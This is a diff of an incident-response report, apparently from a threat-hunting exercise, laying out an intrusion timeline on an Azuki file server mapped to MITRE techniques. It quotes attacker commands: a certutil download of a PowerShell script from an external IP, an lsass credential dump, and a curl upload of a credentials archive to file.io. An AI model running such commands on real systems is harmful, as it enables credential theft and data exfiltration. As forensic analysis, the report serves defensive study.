@@ -49,77 +49,123 @@ This report documents each phase of the intrusion and the analytical steps taken
 
 This timeline consolidates attacker behaviors observed across MDE telemetry. Each entry represents a confirmed activity tied to a specific phase of the intrusion.
 
-🛬 Initial Access & Return Activity
-Timestamp	System	Account	Action	IOC
-Nov 19, 2025 7:10:42 PM	azuki-fileserver01	fileadmin	LogonSuccess	Pivot from azuki-sl (RemoteIP 10.10.1.204)
-Nov 22, 2025 12:27:53 AM	azuki-sl	kenji.sato	LogonSuccess	Return from external source 159.26.106.98
+### Initial Access & Return Activity
 
-TTP: Initial Access → Return Infrastructure (MITRE TA0001)
+Nov 19, 2025 7:10:42 PM
 
-🚚 Lateral Movement to High-Value Assets
-Timestamp	System	Account	Action	IOC
-Nov 22, 2025 12:11:14 AM	azuki-fileserver01	fileadmin	LogonSuccess	Compromised admin account used from 10.0.8.4
+System: azuki-fileserver01
 
-TTP: Remote Services (MITRE T1021)
+Account: fileadmin
 
-🔎 Discovery Phase
+Event: Successful remote logon from 10.10.1.204
+
+Technique: Initial Access / Lateral Movement (T1021)
+
+Nov 22, 2025 12:27:53 AM
+
+System: azuki-sl
+
+Account: kenji.sato
+
+Event: External logon from 159.26.106.98
+
+Technique: Initial Access (TA0001)
+
+### Lateral Movement to File Server
+
+Nov 22, 2025 12:11:14 AM
+
+System: azuki-fileserver01
+
+Account: fileadmin
+
+Event: Remote logon from 10.0.8.4
+
+Technique: Remote Services (T1021)
+
+### System & Network Discovery
 Timestamp	Command	Technique
-12:40:54 AM	net share	Local Share Enumeration
-12:42:01 AM	net view \\10.1.0.188	Remote Share Enumeration
-12:40:09 AM	whoami /all	Privilege Discovery
-12:42:46 AM	ipconfig /all	Network Configuration Discovery
+12:40:54 AM	net share	Local Share Discovery (T1135)
+12:42:01 AM	net view \\10.1.0.188	Remote Share Discovery (T1135)
+12:40:09 AM	whoami /all	Privilege Discovery (T1033)
+12:42:46 AM	ipconfig /all	Network Config Discovery (T1016)
 
-System + Account: azuki-fileserver01 — fileadmin
-TTPs: T1083, T1135, T1033, T1016
+Device: azuki-fileserver01 — Account: fileadmin
 
-🕵️‍♂️ Defense Evasion
-Timestamp	Command	Purpose
-12:55:43 AM	attrib +h +s C:\Windows\Logs\CBS	Hiding staging directory
+### Defense Evasion
 
-Device: azuki-fileserver01
-TTP: Hidden Files & Directories (T1564.001)
+12:55:43 AM
 
-📥 Ingress Tool Transfer
-Timestamp	Command	Payload
-12:58:24 AM	certutil -urlcache -f http://78.141.196.6:67331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1	PS1 downloader tool
+Command: attrib +h +s C:\Windows\Logs\CBS
 
-Device: azuki-fileserver01 — fileadmin
-TTP: Ingress Tool Transfer (T1105)
+Purpose: Hide staging folder
 
-📂 Collection & Data Staging
-Timestamp	Command	Source → Destination
-1:06:03 AM	xcopy C:\FileShares\Financial C:\Windows\Logs\CBS\financial /E /I /H /Y	Sensitive file share → staging directory
-1:07:53 AM	Created file	IT-Admin-Passwords.csv
+Technique: Hidden Files & Directories (T1564.001)
 
-TTPs: Automated Collection (T1119)
-Indicators: Data aggregation in hidden CBS folder
+### Ingress Tool Transfer
 
-🗜️ Compression of Stolen Data
-Timestamp	Command	Output
-1:25:31 AM	tar -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .	GZIP archive created
+12:58:24 AM
 
-TTP: Archive via Utility (T1560.001)
+Command: certutil -urlcache -f http://78.141.196.6:67331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
 
-🧩 Credential Access
-Timestamp	Event	Output File
-~2:24:47 AM	pd -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp	lsass.dmp dump created
+Technique: Ingress Tool Transfer (T1105)
 
-TTP: OS Credential Dumping (T1003.001)
+Device: azuki-fileserver01 — Account: fileadmin
 
-☁️ Exfiltration
-Timestamp	Command	Destination
-2:06:08 AM	curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io	External cloud service file.io
+### Collection & Data Staging
 
-TTP: Exfiltration to Cloud Storage (T1567.002)
+1:06:03 AM
 
-♻️ Persistence
-Timestamp	Registry Modification	Beacon
-(Timestamp from RegistryEvent Query E)	Created Run key → FileShareSync	Launches svchost.ps1
+Command: xcopy C:\FileShares\Financial C:\Windows\Logs\CBS\financial /E /I /H /Y
 
-TTP: Registry Run Keys (T1547.001)
+Technique: Automated Collection (T1119)
 
-🧹 Anti-Forensics Cleanup
-Timestamp	File Deleted	Why
-2:26:01 AM	ConsoleHost_history.txt	Removed PowerShell command evidence
+1:07:53 AM
 
-TTP: Clear Command History (T1070.003)
+File Created: IT-Admin-Passwords.csv
+
+Technique: Credentials Harvesting (T1552)
+
+### Compression of Staged Data
+
+1:25:31 AM
+
+Command: tar -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .
+
+Technique: Archive Collected Data (T1560.001)
+
+### Credential Access
+
+~2:24:47 AM
+
+Command: pd -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
+
+Output: lsass.dmp memory dump
+
+Technique: OS Credential Dumping (T1003.001)
+
+### Exfiltration to Cloud Storage
+
+2:06:08 AM
+
+Command: curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
+
+Technique: Exfiltration to Cloud Storage (T1567.002)
+
+### Persistence Mechanism
+
+Registry Modification Timestamp (from Query E)
+
+Key Value: FileShareSync (Run key)
+
+Payload: svchost.ps1
+
+Technique: Registry Run Keys (T1547.001)
+
+### Anti-Forensics / Cleanup
+
+2:26:01 AM
+
+File Deleted: ConsoleHost_history.txt
+
+Technique: Clear Command History (T1070.003)
